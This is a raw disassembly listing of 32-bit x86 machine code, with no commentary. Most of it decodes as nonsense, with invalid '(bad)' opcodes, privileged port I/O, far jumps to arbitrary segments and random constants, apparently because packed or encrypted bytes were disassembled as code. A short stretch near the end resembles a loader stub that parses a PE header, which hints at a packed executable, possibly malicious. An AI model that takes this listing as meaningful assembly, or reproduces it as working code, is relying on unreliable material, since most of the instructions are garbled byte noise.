  40f897:	fbstp  TBYTE PTR [eax-0x4b]
  40f89a:	iret   
  40f89b:	sbb    eax,0xbbc0466e
  40f8a0:	sbb    al,0xaa
  40f8a2:	ds dec eax
  40f8a4:	mov    edx,0xc1fd05ad
  40f8a9:	arpl   WORD PTR [ecx],bp
  40f8ab:	int    0xcd
  40f8ad:	loop   0x40f862
  40f8af:	out    dx,eax
  40f8b0:	cmc    
  40f8b1:	sar    DWORD PTR [ebp+0x7b52b2b4],1
  40f8b7:	fisub  WORD PTR [esi]
  40f8b9:	(bad)  
  40f8ba:	or     DWORD PTR [ecx-0x10],esi
  40f8bd:	fimul  DWORD PTR [ecx-0x29]
  40f8c0:	outs   dx,DWORD PTR ds:[esi]
  40f8c1:	dec    esp
  40f8c2:	repnz loope 0x40f85c
  40f8c5:	cmc    
  40f8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8c7:	into   
  40f8c8:	jle    0x40f8de
  40f8ca:	sub    eax,0x80f49029
  40f8cf:	imul   ebx,esp,0xffffff8b
  40f8d2:	cmp    BYTE PTR [edi],al
  40f8d4:	or     ecx,DWORD PTR [edx+0x2f]
  40f8d7:	stc    
  40f8d8:	dec    esi
  40f8d9:	sbb    bl,ah
  40f8db:	inc    edx
  40f8dc:	mov    edi,0xc9192260
  40f8e1:	rcpps  xmm2,XMMWORD PTR [ecx+0x70746ac5]
  40f8e8:	ror    DWORD PTR [eax-0x6],cl
  40f8eb:	sub    DWORD PTR [eax+ebp*2],edi
  40f8ee:	jo     0x40f95e
  40f8f0:	shr    DWORD PTR [ecx-0x47dbf8fa],1
  40f8f6:	ret    0x5d5
  40f8f9:	dec    eax
  40f8fa:	pusha  
  40f8fb:	sub    eax,0x240ffe98
  40f900:	fnstsw WORD PTR [ecx]
  40f902:	lods   eax,DWORD PTR ds:[esi]
  40f903:	inc    ebp
  40f904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f905:	mov    esp,0xcdfd36d8
  40f90a:	ja     0x40f8dd
  40f90c:	ret    
  40f90d:	xchg   BYTE PTR [edi-0x7e],ch
  40f910:	push   edx
  40f911:	into   
  40f912:	into   
  40f913:	push   edi
  40f914:	push   esi
  40f915:	mov    bl,0x6d
  40f917:	leave  
  40f918:	mov    cl,0x7d
  40f91a:	jecxz  0x40f8b7
  40f91c:	ins    DWORD PTR es:[edi],dx
  40f91d:	test   eax,0xd06a950b
  40f922:	push   ebp
  40f923:	clc    
  40f924:	pop    ebp
  40f925:	inc    eax
  40f926:	add    eax,esp
  40f928:	push   eax
  40f929:	leave  
  40f92a:	jecxz  0x40f977
  40f92c:	stos   DWORD PTR es:[edi],eax
  40f92d:	jmp    0xc778b68d
  40f932:	aas    
  40f933:	mov    esp,0x46ea30ac
  40f938:	leave  
  40f939:	sub    ebx,eax
  40f93b:	pusha  
  40f93c:	int    0x1
  40f93e:	sub    esp,DWORD PTR [edi-0xb]
  40f941:	jae    0x40f920
  40f943:	jle    0x40f8d0
  40f945:	and    DWORD PTR [ebp+edi*1-0x33],ebp
  40f949:	xor    BYTE PTR [ebx-0x3],dl
  40f94c:	dec    ebp
  40f94d:	sub    ecx,DWORD PTR [ecx]
  40f94f:	add    DWORD PTR [ebp+0x15],esi
  40f952:	cld    
  40f953:	sbb    eax,0xcb203f7f
  40f958:	adc    al,0xb2
  40f95a:	jmp    0x93ec:0x680e897e
  40f961:	(bad)  
  40f962:	shl    DWORD PTR [ecx],0xaa
  40f965:	out    dx,al
  40f966:	xor    edi,0x7f7f1db1
  40f96c:	push   ecx
  40f96d:	jge    0x40f989
  40f96f:	sub    al,0xba
  40f971:	jbe    0x40f940
  40f973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f974:	aad    0xe1
  40f976:	mov    DWORD PTR [ecx+0x6277428d],eax
  40f97c:	cs sti 
  40f97e:	or     dh,BYTE PTR ds:0xbf04fda2
  40f984:	dec    edx
  40f985:	push   0xf
  40f987:	popf   
  40f988:	jp     0x40f9ea
  40f98a:	std    
  40f98b:	or     BYTE PTR [esi-0x73ee6d1d],0x8b
  40f992:	xchg   esi,eax
  40f993:	js     0x40f93c
  40f995:	lods   eax,DWORD PTR ds:[esi]
  40f996:	sar    BYTE PTR [ebx-0x4f102101],cl
  40f99c:	dec    BYTE PTR [edi+0x6ba6ea84]
  40f9a2:	leave  
  40f9a3:	in     eax,dx
  40f9a4:	iret   
  40f9a5:	cdq    
  40f9a6:	add    cl,BYTE PTR [ebx]
  40f9a8:	rol    edx,cl
  40f9aa:	sub    al,0x65
  40f9ac:	in     eax,0x6f
  40f9ae:	mov    ebx,0x68cf343e
  40f9b3:	push   esp
  40f9b4:	or     cl,BYTE PTR [ebx-0x5f]
  40f9b7:	aaa    
  40f9b8:	sbb    DWORD PTR [edi+0x1c0bc9e3],ebx
  40f9be:	dec    ebx
  40f9bf:	ds iret 
  40f9c1:	sbb    BYTE PTR [esi+0x7c],dh
  40f9c4:	xchg   DWORD PTR [edx+eax*1+0x3],edx
  40f9c8:	ds adc dh,al
  40f9cb:	jo     0x40fa4c
  40f9cd:	or     ebp,DWORD PTR [esi+0xc]
  40f9d0:	je     0x40f9d2
  40f9d2:	dec    ebx
  40f9d3:	repnz dec edx
  40f9d5:	inc    ecx
  40f9d6:	inc    ebp
  40f9d7:	scas   al,BYTE PTR es:[edi]
  40f9d8:	jae    0x40fa0c
  40f9da:	jo     0x40f96c
  40f9dc:	jle    0x40fa4f
  40f9de:	cdq    
  40f9df:	cli    
  40f9e0:	shl    DWORD PTR [esi+0x46],cl
  40f9e3:	loop   0x40f993
  40f9e5:	mov    eax,0x1ce403b
  40f9ea:	imul   edx,DWORD PTR [esi],0xffffffcd
  40f9ed:	mov    ds:0x8ed0d6ab,al
  40f9f2:	jmp    0x384ddf2e
  40f9f7:	adc    eax,0x41540074
  40f9fc:	cmp    al,BYTE PTR [eax-0x5f]
  40f9ff:	pop    ds
  40fa00:	bnd jns 0x40fa5b
  40fa03:	lahf   
  40fa04:	xor    ebx,ebx
  40fa06:	psllw  mm1,QWORD PTR [ebx+0x637ba970]
  40fa0d:	imul   edi,DWORD PTR [eax],0xfffffffa
  40fa10:	jbe    0x40f9b0
  40fa12:	mov    eax,0x70b93cf4
  40fa17:	add    BYTE PTR [esi+0x350ee74e],dh
  40fa1d:	inc    ebx
  40fa1e:	ds and al,0x8f
  40fa21:	hlt    
  40fa22:	push   ss
  40fa23:	cmp    eax,0xbd0cea2a
  40fa28:	xor    edi,DWORD PTR [ebp-0x2a]
  40fa2b:	ins    DWORD PTR es:[edi],dx
  40fa2c:	not    BYTE PTR [ebp+eax*8+0x3b]
  40fa30:	pop    ebx
  40fa31:	mov    dl,0x49
  40fa33:	dec    DWORD PTR [eax+0x11]
  40fa36:	sbb    eax,0xf27aab6b
  40fa3b:	add    BYTE PTR [esi+0x3d6c9556],dh
  40fa41:	mov    dl,0x5e
  40fa43:	je     0x40f9e5
  40fa45:	or     ah,ah
  40fa47:	jb     0x40fa8e
  40fa49:	cmp    edi,DWORD PTR [ecx+0x597830c1]
  40fa4f:	mov    ebx,0xc2019cfc
  40fa54:	in     al,0xc4
  40fa56:	mov    DWORD PTR [ebx],edi
  40fa58:	dec    edi
  40fa59:	xchg   BYTE PTR [esi],ch
  40fa5b:	test   DWORD PTR [esi+esi*1-0x7b6346bc],ebp
  40fa62:	pop    esi
  40fa63:	jns    0x40fa74
  40fa65:	arpl   WORD PTR [eax+0x257b3f88],cx
  40fa6b:	cdq    
  40fa6c:	retf   
  40fa6d:	ja     0x40fa5a
  40fa6f:	xor    eax,DWORD PTR [esi+0x25e2875f]
  40fa75:	and    eax,0x218a3a79
  40fa7a:	cmp    al,BYTE PTR [ebx+0xf]
  40fa7d:	sbb    al,BYTE PTR [ebx]
  40fa7f:	xchg   ecx,eax
  40fa80:	pop    esi
  40fa81:	pop    esp
  40fa82:	adc    DWORD PTR [ecx],edx
  40fa84:	add    ch,BYTE PTR [ebx+0xc79ccc3]
  40fa8a:	stos   DWORD PTR es:[edi],eax
  40fa8b:	popf   
  40fa8c:	int    0x20
  40fa8e:	push   edx
  40fa8f:	xchg   edi,eax
  40fa90:	cmpps  xmm7,XMMWORD PTR [edx],0x42
  40fa94:	and    eax,0x12a37fa1
  40fa99:	or     eax,0x4c0402a3
  40fa9e:	xchg   ebx,eax
  40fa9f:	inc    ebp
  40faa0:	mov    ds:0xafc46965,eax
  40faa5:	adc    eax,0xfa16f232
  40faaa:	stos   BYTE PTR es:[edi],al
  40faab:	fsubp  st(6),st
  40faad:	cmp    ch,cl
  40faaf:	push   esi
  40fab0:	repz cld 
  40fab2:	push   ebx
  40fab3:	inc    ecx
  40fab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fab5:	xchg   ecx,eax
  40fab6:	push   cs
  40fab7:	shl    BYTE PTR [edi-0x210ee2aa],1
  40fabd:	int3   
  40fabe:	xchg   edi,eax
  40fabf:	push   ebp
  40fac0:	xchg   esi,eax
  40fac1:	aam    0xa1
  40fac3:	jns    0x40fae8
  40fac5:	mov    dl,0xf
  40fac7:	mov    bh,0xda
  40fac9:	adc    eax,0xb10df71c
  40face:	xor    DWORD PTR [ecx+0x32faf5bb],eax
  40fad4:	mov    ebp,0x18540a6e
  40fad9:	stos   BYTE PTR es:[edi],al
  40fada:	xchg   ebx,eax
  40fadb:	jp     0x40faee
  40fadd:	gs mov ch,0x30
  40fae0:	rdpmc  
  40fae2:	cli    
  40fae3:	je     0x40fb3d
  40fae5:	mov    ch,0x48
  40fae7:	lahf   
  40fae8:	jmp    0x40fab3
  40faea:	mov    edi,0x1b6304ca
  40faef:	or     ecx,DWORD PTR [edx+0x2ce913ff]
  40faf5:	jecxz  0x40fa89
  40faf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faf8:	jecxz  0x40fa9f
  40fafa:	ja     0x40fb61
  40fafc:	jae    0x40fa81
  40fafe:	mov    ecx,0x5cf60691
  40fb03:	cwde   
  40fb04:	jmp    0x40fb4c
  40fb06:	and    al,0xb6
  40fb08:	or     edx,ecx
  40fb0a:	mov    dl,ch
  40fb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb0d:	or     cl,BYTE PTR [edi-0x33623ac1]
  40fb13:	stc    
  40fb14:	mov    eax,ds:0xdaed63c4
  40fb19:	inc    ecx
  40fb1a:	or     ebx,DWORD PTR [edx]
  40fb1c:	push   ds
  40fb1d:	mov    ch,0x93
  40fb1f:	xor    ebx,DWORD PTR [ebx+ebp*2]
  40fb22:	out    dx,eax
  40fb23:	jle    0x40fb57
  40fb25:	jmp    0x43fe:0x288705ca
  40fb2c:	push   cs
  40fb2d:	ja     0x40fb6e
  40fb2f:	mov    ecx,0xf01a2e00
  40fb34:	(bad)  
  40fb35:	mov    DWORD PTR [edi],edi
  40fb37:	mov    eax,ds:0xa4a84b41
  40fb3c:	jg     0x40faf7
  40fb3e:	and    al,0xd9
  40fb40:	xor    DWORD PTR [ecx],eax
  40fb42:	and    eax,0xb9954fd8
  40fb47:	cmp    eax,0x1c1f0512
  40fb4c:	pushf  
  40fb4d:	and    bh,BYTE PTR [edx-0x1964bb31]
  40fb53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb54:	push   ebx
  40fb55:	stos   DWORD PTR es:[edi],eax
  40fb56:	les    edi,FWORD PTR [ebx]
  40fb58:	out    0xd7,eax
  40fb5a:	je     0x40fb15
  40fb5c:	mov    ebp,0x26b4227d
  40fb61:	add    BYTE PTR [ecx],bh
  40fb63:	(bad)  [ecx+esi*8+0x39]
  40fb67:	pop    ds
  40fb68:	aas    
  40fb69:	xchg   esp,eax
  40fb6a:	aam    0xba
  40fb6c:	mov    al,0x3b
  40fb6e:	mov    esi,0x32b0c4ea
  40fb73:	lods   eax,DWORD PTR ds:[esi]
  40fb74:	imul   ebp,DWORD PTR [eax+0x29],0xfffffff0
  40fb78:	hlt    
  40fb79:	pop    es
  40fb7a:	push   0x4a
  40fb7c:	outs   dx,BYTE PTR ds:[esi]
  40fb7d:	test   eax,0x1beb3fc2
  40fb82:	inc    edi
  40fb83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb84:	xor    al,0xe0
  40fb86:	fwait
  40fb87:	jecxz  0x40fb34
  40fb89:	es jmp eax
  40fb8c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb8e:	(bad)  
  40fb8f:	sub    ecx,DWORD PTR [eax+0x1fad31f8]
  40fb95:	inc    eax
  40fb96:	cld    
  40fb97:	out    dx,eax
  40fb98:	pop    ss
  40fb99:	lahf   
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e224
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xd3
  40fbb3:	sub    BYTE PTR [ebx+eax*8],0x82
  40fbb7:	mov    cl,0x70
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fb4c
  40fbbf:	jle    0x40fb4a
  40fbc1:	mov    bl,bl
  40fbc3:	inc    esi
  40fbc4:	xlat   BYTE PTR ds:[ebx]
  40fbc5:	pop    esi
  40fbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc7:	push   edx
  40fbc8:	and    BYTE PTR [eax],bl
  40fbca:	xor    ax,0x2936
  40fbce:	pop    edx
  40fbcf:	stos   BYTE PTR es:[edi],al
  40fbd0:	inc    eax
  40fbd1:	nop
  40fbd2:	mov    esp,eax
  40fbd4:	clc    
  40fbd5:	or     DWORD PTR [edi],esp
  40fbd7:	add    eax,0x7ff5b4ac
  40fbdd:	mov    al,0xda
  40fbdf:	out    dx,al
  40fbe0:	pop    esp
  40fbe1:	xchg   DWORD PTR [ecx-0x6ec2c301],edx
  40fbe7:	sbb    dh,BYTE PTR [esi+0x1b]
  40fbea:	push   ecx
  40fbeb:	add    al,0x36
  40fbed:	push   eax
  40fbee:	dec    edx
  40fbef:	xor    eax,0xde8ee6e7
  40fbf4:	je     0x40fba6
  40fbf6:	stos   WORD PTR es:[edi],ax
  40fbf8:	mov    eax,ds:0x58eaa6cf
  40fbfd:	or     eax,0x67209d92
  40fc02:	inc    edx
  40fc03:	sub    al,0xac
  40fc05:	fimul  DWORD PTR [edx]
  40fc07:	pop    ebx
  40fc08:	dec    ebp
  40fc09:	jmp    0x92a3:0x90484e19
  40fc10:	xor    al,0x12
  40fc12:	das    
  40fc13:	rol    dl,cl
  40fc15:	sbb    al,0x35
  40fc17:	inc    ecx
  40fc18:	(bad)  [ecx+eax*2+0x53]
  40fc1c:	push   0x96fe9e46
  40fc21:	and    edx,ebx
  40fc23:	nop    DWORD PTR [esi+ecx*8+0x29632d17]
  40fc2b:	pop    eax
  40fc2c:	jl     0x40fc4b
  40fc2e:	mov    eax,ds:0xb00d5919
  40fc33:	fdivr  QWORD PTR [ebx+0x61]
  40fc36:	cmp    eax,0x5d5c5847
  40fc3b:	add    dl,bh
  40fc3d:	add    al,0x41
  40fc3f:	aas    
  40fc40:	ins    BYTE PTR es:[edi],dx
  40fc41:	dec    edx
  40fc42:	hlt    
  40fc43:	ja     0x40fc35
  40fc45:	and    DWORD PTR [esi-0xc],eax
  40fc48:	not    edx
  40fc4a:	xchg   DWORD PTR [eax+ebp*4-0x35],ebp
  40fc4e:	jge    0x40fbed
  40fc50:	lahf   
  40fc51:	fadd   QWORD PTR [ecx-0x60]
  40fc54:	xchg   DWORD PTR [esi+eax*2+0x4e],esp
  40fc58:	fs iret 
  40fc5a:	lds    esp,FWORD PTR [ebp-0x7e]
  40fc5d:	ror    dl,1
  40fc5f:	out    0x71,eax
  40fc61:	ret    
  40fc62:	ss dec esi
  40fc64:	push   ds
  40fc65:	mov    eax,0xcacc57ba
  40fc6a:	shl    DWORD PTR [ebp+edx*1+0x5ff595a6],0xee
  40fc72:	ret    0x8c90
  40fc75:	jle    0x40fcb9
  40fc77:	pop    esp
  40fc78:	add    ah,dl
  40fc7a:	fcom   QWORD PTR ds:[ecx+ebx*4-0x26f725b8]
  40fc82:	sub    ecx,ebx
  40fc84:	and    bl,BYTE PTR [esi]
  40fc86:	out    dx,al
  40fc87:	mov    esp,0xc3945b6b
  40fc8c:	ja     0x40fc7b
  40fc8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc8f:	pop    ebp
  40fc90:	fimul  DWORD PTR [edi+0x4d05a0fa]
  40fc96:	scas   eax,DWORD PTR es:[edi]
  40fc97:	enter  0x38df,0xad
  40fc9b:	and    DWORD PTR [ebp+0x2822b901],ebp
  40fca1:	push   eax
  40fca2:	jmp    0x6baa40f3
  40fca7:	pushf  
  40fca8:	loop   0x40fcd4
  40fcaa:	cs hlt 
  40fcac:	push   cs
  40fcad:	out    0x62,eax
  40fcaf:	sar    BYTE PTR [edi-0x56af566d],1
  40fcb5:	bound  ecx,QWORD PTR [eax]
  40fcb7:	mov    ebp,ds
  40fcb9:	cmp    DWORD PTR [esp+edi*2+0x1982b39],edx
  40fcc0:	repz pop esi
  40fcc2:	push   es
  40fcc3:	jo     0x40fcbd
  40fcc5:	xchg   ebp,eax
  40fcc6:	ret    
  40fcc7:	jmp    0xb326faec
  40fccc:	out    dx,eax
  40fccd:	mov    ebp,0xfd0c20cb
  40fcd2:	mov    ecx,0x826d05a6
  40fcd7:	clc    
  40fcd8:	adc    eax,0x117f5ae5
  40fcdd:	and    eax,0xe4607468
  40fce2:	and    DWORD PTR [eax+0x4a5b73f3],0xffffffc9
  40fce9:	fucomp st(1)
  40fceb:	cmp    edx,edi
  40fced:	jae    0x40fcb3
  40fcef:	jle    0x40fc76
  40fcf1:	repnz pop ebp
  40fcf3:	xor    BYTE PTR [ebx],al
  40fcf5:	cmp    esp,DWORD PTR [ecx]
  40fcf7:	adc    BYTE PTR [ebp+0x79],ah
  40fcfa:	fnstcw WORD PTR [edi-0x68d93a20]
  40fd00:	jecxz  0x40fcb0
  40fd02:	jl     0x40fd2c
  40fd04:	mov    esp,0x20d3d499
  40fd09:	popf   
  40fd0a:	jmp    0xc0bd:0xe4953e2
  40fd11:	inc    edi
  40fd12:	mov    ds:0xa2c162af,eax
  40fd17:	xchg   BYTE PTR [eax+0x3a],ch
  40fd1a:	aaa    
  40fd1b:	xor    ebx,ecx
  40fd1d:	retf   
  40fd1e:	enter  0x2cbf,0x21
  40fd22:	mov    WORD PTR [edx+0x3561b3f2],?
  40fd28:	jo     0x40fd81
  40fd2a:	jg     0x40fd75
  40fd2c:	xlat   BYTE PTR ds:[ebx]
  40fd2d:	xor    DWORD PTR [eax+0x772d258a],edx
  40fd33:	sub    dh,al
  40fd35:	in     eax,dx
  40fd36:	xchg   WORD PTR [edi+0x1a3430b],bp
  40fd3d:	mov    BYTE PTR [ecx+0x5ec1c153],bh
  40fd43:	das    
  40fd44:	repnz pop ebx
  40fd46:	dec    edx
  40fd47:	jne    0x40fdbb
  40fd49:	xchg   DWORD PTR ds:0xd8f1f118,edi
  40fd4f:	(bad)  
  40fd50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd51:	frstor [edi+0x338ae017]
  40fd57:	(bad)  
  40fd58:	psubd  mm3,mm5
  40fd5b:	ss (bad) 
  40fd5d:	mov    ds,ebp
  40fd5f:	mov    esi,0x6064dc0c
  40fd64:	popf   
  40fd65:	(bad)  
  40fd66:	mov    ch,0x84
  40fd68:	push   0xb9c1f2aa
  40fd6d:	repz out dx,al
  40fd6f:	je     0x40fd29
  40fd71:	fs jns 0x40fd10
  40fd74:	add    eax,0xa5e0146e
  40fd79:	and    ax,0x7682
  40fd7d:	out    0x5d,eax
  40fd7f:	add    BYTE PTR [eax],ch
  40fd81:	and    ch,bl
  40fd83:	or     esi,DWORD PTR [ecx]
  40fd85:	push   edi
  40fd86:	mov    ebx,0x216c80d3
  40fd8b:	adc    eax,0xaeca9aac
  40fd90:	jbe    0x40fd6b
  40fd92:	test   al,0xc5
  40fd94:	push   0xffffffa5
  40fd96:	aad    0xa
  40fd98:	jp     0x40fd3b
  40fd9a:	bound  esi,QWORD PTR [ebx-0x59e99deb]
  40fda0:	xor    bh,dl
  40fda2:	sbb    dh,BYTE PTR [esi+esi*4+0x59]
  40fda6:	and    BYTE PTR [edi-0x6e],ah
  40fda9:	aad    0x1a
  40fdab:	cdq    
  40fdac:	hlt    
  40fdad:	adc    al,0x52
  40fdaf:	scas   al,BYTE PTR es:[edi]
  40fdb0:	ror    esp,cl
  40fdb2:	iret   
  40fdb3:	sahf   
  40fdb4:	stos   BYTE PTR es:[edi],al
  40fdb5:	fsubr  QWORD PTR [edx-0x46]
  40fdb8:	mov    al,ds:0xc50db05c
  40fdbd:	cs mov dl,0x34
  40fdc0:	clc    
  40fdc1:	test   al,0x2
  40fdc3:	dec    esi
  40fdc4:	imul   ebx,DWORD PTR [esi],0xb3de8668
  40fdca:	sbb    eax,DWORD PTR [ebx]
  40fdcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdcd:	popf   
  40fdce:	mov    bh,0xc8
  40fdd0:	arpl   WORD PTR [esi],dx
  40fdd2:	retf   
  40fdd3:	or     DWORD PTR [edi+edi*1+0x2ed007ae],ebx
  40fdda:	xchg   DWORD PTR [edx+0x22],ecx
  40fddd:	dec    ebx
  40fdde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fddf:	ror    cl,cl
  40fde1:	sub    esi,DWORD PTR [ebx]
  40fde3:	icebp  
  40fde4:	in     eax,0xb8
  40fde6:	call   0x821d:0xa493b534
  40fded:	xchg   edi,eax
  40fdee:	nop
  40fdef:	retf   
  40fdf0:	jge    0x40fe5c
  40fdf2:	neg    edx
  40fdf4:	add    DWORD PTR [edi+0x110a0a16],esi
  40fdfa:	push   cs
  40fdfb:	inc    edi
  40fdfc:	dec    edx
  40fdfd:	mov    gs,WORD PTR [ebp+0xa495f8]
  40fe03:	push   ebx
  40fe04:	in     al,0x77
  40fe06:	je     0x40fdc2
  40fe08:	lds    edi,FWORD PTR [edx]
  40fe0a:	call   0xec4381d2
  40fe0f:	mov    bl,0x61
  40fe11:	jno    0x40fe5f
  40fe13:	imul   edi,DWORD PTR [ecx+0x7f838b24],0xb4765070
  40fe1d:	and    al,0xc0
  40fe1f:	call   0x63556f75
  40fe24:	arpl   WORD PTR [eax+ebx*4-0xfe52561],dx
  40fe2b:	or     eax,0x39159867
  40fe30:	scas   al,BYTE PTR es:[edi]
  40fe31:	add    eax,DWORD PTR [ecx-0x27]
  40fe34:	jo     0x40fe18
  40fe36:	dec    esp
  40fe37:	adc    al,0xea
  40fe39:	mov    ebp,0xe7df7551
  40fe3e:	cmp    al,0x62
  40fe40:	clc    
  40fe41:	aas    
  40fe42:	nop
  40fe43:	popf   
  40fe44:	push   0xe
  40fe46:	mov    al,ds:0xc1b850c2
  40fe4b:	into   
  40fe4c:	mov    ebp,0xfdff3f78
  40fe51:	cmp    cl,0x48
  40fe54:	sbb    dl,ah
  40fe56:	ds pop esi
  40fe58:	inc    esi
  40fe59:	leavew 
  40fe5b:	pop    ds
  40fe5c:	lock ins DWORD PTR es:[edi],dx
  40fe5e:	setno  BYTE PTR [ebp-0x32]
  40fe62:	inc    esi
  40fe63:	rcl    DWORD PTR [edx+eiz*1],1
  40fe66:	fcmovnb st,st(4)
  40fe68:	adc    ah,BYTE PTR [esi]
  40fe6a:	push   edi
  40fe6b:	and    eax,0x63f0f448
  40fe70:	std    
  40fe71:	outs   dx,DWORD PTR ds:[esi]
  40fe72:	div    bh
  40fe74:	mov    eax,ds:0xf17055f0
  40fe79:	or     al,0x74
  40fe7b:	test   eax,0xf7987e36
  40fe80:	push   0x6e
  40fe82:	xor    ecx,0x29
  40fe85:	clc    
  40fe86:	lahf   
  40fe87:	test   eax,0x56a43d0a
  40fe8c:	pop    ecx
  40fe8d:	sahf   
  40fe8e:	jne    0x40fe62
  40fe90:	(bad)  [esi]
  40fe92:	shl    DWORD PTR [ebx-0x25],cl
  40fe95:	dec    eax
  40fe96:	sub    edi,DWORD PTR [eax*2+0x6a7ca99a]
  40fe9d:	pop    ebp
  40fe9e:	loopne 0x40fe58
  40fea0:	dec    edi
  40fea1:	mov    ah,0x9c
  40fea3:	idiv   DWORD PTR [ebx+ebx*1]
  40fea6:	mov    bh,0xce
  40fea8:	arpl   ax,di
  40feaa:	sbb    BYTE PTR [esi-0x1b],dh
  40fead:	mov    bl,0xc5
  40feaf:	mov    edi,0x5a791f00
  40feb4:	xor    bl,bh
  40feb6:	sub    ah,BYTE PTR [edx+ebp*2+0xa]
  40feba:	(bad)  
  40febd:	xor    bl,BYTE PTR [ebx+0x4bded0f9]
  40fec3:	sbb    al,ch
  40fec5:	or     eax,0xdbb4e41d
  40feca:	mov    ds:0xdf84396f,eax
  40fecf:	pusha  
  40fed0:	push   es
  40fed1:	pop    esi
  40fed2:	pusha  
  40fed3:	gs clc 
  40fed5:	lea    ebp,[eax-0x38]
  40fed8:	xchg   ebx,eax
  40fed9:	pop    ds
  40feda:	ja     0x40fe91
  40fedc:	xchg   esp,eax
  40fedd:	inc    ebp
  40fede:	les    edx,FWORD PTR [ebx-0x15]
  40fee1:	mov    esi,DWORD PTR [ebp-0x2586836f]
  40fee7:	mov    dl,0x3b
  40fee9:	jecxz  0x40fe7d
  40feeb:	std    
  40feec:	jp     0x40ff21
  40feee:	sbb    BYTE PTR [esi],dl
  40fef0:	lods   al,BYTE PTR ds:[esi]
  40fef1:	mov    esi,0x9737dd75
  40fef6:	mov    dh,0x12
  40fef8:	jno    0x40ff52
  40fefa:	mov    eax,0xce24e8f9
  40feff:	push   ebp
  40ff00:	cmp    al,BYTE PTR [edi-0x68b3f867]
  40ff06:	outs   dx,DWORD PTR ds:[esi]
  40ff07:	push   esi
  40ff08:	xchg   edx,eax
  40ff09:	shr    edx,1
  40ff0b:	and    eax,0x5091c88f
  40ff10:	pop    ecx
  40ff11:	jmp    FWORD PTR [ebx-0x364f41db]
  40ff17:	ja     0x40ff8e
  40ff19:	sub    ecx,ebp
  40ff1b:	sbb    eax,0x90473bf8
  40ff20:	mov    bh,BYTE PTR [edi+eiz*2]
  40ff23:	daa    
  40ff24:	mov    WORD PTR [esi-0x14fc6906],ds
  40ff2a:	loope  0x40ff06
  40ff2c:	lods   eax,DWORD PTR ds:[esi]
  40ff2d:	je     0x40ffa9
  40ff2f:	sub    ebx,DWORD PTR [eax+0x50]
  40ff32:	pop    edi
  40ff33:	inc    edi
  40ff34:	mov    dh,0x93
  40ff36:	test   BYTE PTR [eax+0x5b8e98cb],bl
  40ff3c:	(bad)  
  40ff3f:	cwde   
  40ff40:	lods   al,BYTE PTR ds:[esi]
  40ff41:	stc    
  40ff42:	pushf  
  40ff43:	add    eax,0xd3840fec
  40ff48:	mul    BYTE PTR [ecx]
  40ff4a:	rcr    BYTE PTR [edi+ecx*2],cl
  40ff4d:	imul   ecx,DWORD PTR [edi],0x4f1248f4
  40ff53:	loopne 0x40ffb5
  40ff55:	enter  0x33a6,0xea
  40ff59:	loop   0x40fee0
  40ff5b:	jne    0x40feeb
  40ff5d:	dec    eax
  40ff5e:	jle    0x40ff86
  40ff60:	push   ebp
  40ff61:	sahf   
  40ff62:	mov    bh,0xf
  40ff64:	leave  
  40ff65:	mov    dl,0xa9
  40ff67:	test   al,0x8d
  40ff69:	aam    0xd9
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e234,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e7f7,0x42fe7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fdd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fe76
  40ffaa:	and    edx,DWORD PTR ds:0x42e7fb
  40ffb0:	mov    DWORD PTR ds:0x42fe76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e803,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	push   ecx
  40ffdd:	test   eax,0xbd35f1cf
  40ffe2:	jo     0x410054
  40ffe4:	mov    ds:0x7b70707d,eax
  40ffe9:	loop   0x410044
  40ffeb:	fisub  DWORD PTR [eax]
  40ffed:	sti    
  40ffee:	dec    ebp
  40ffef:	push   ds
  40fff0:	ins    BYTE PTR es:[edi],dx
  40fff1:	lahf   
  40fff2:	rcr    DWORD PTR [ecx*8-0x557de0b7],cl
  40fff9:	dec    edx
  40fffa:	dec    esp
  40fffb:	cld    
  40fffc:	inc    ebp
  40fffd:	mov    al,ds:0xc70451e9
  410002:	enter  0x1168,0xf0
  410006:	inc    ebx
  410007:	mov    DWORD PTR [esi+0x73],eax
  41000a:	jge    0x40ffba
  41000c:	or     eax,0xe5bc5568
  410011:	pop    esp
  410012:	mov    ds:0xf9c48ee6,al
  410017:	mov    ah,0xa2
  410019:	xchg   edi,eax
  41001a:	jp     0x40ffbf
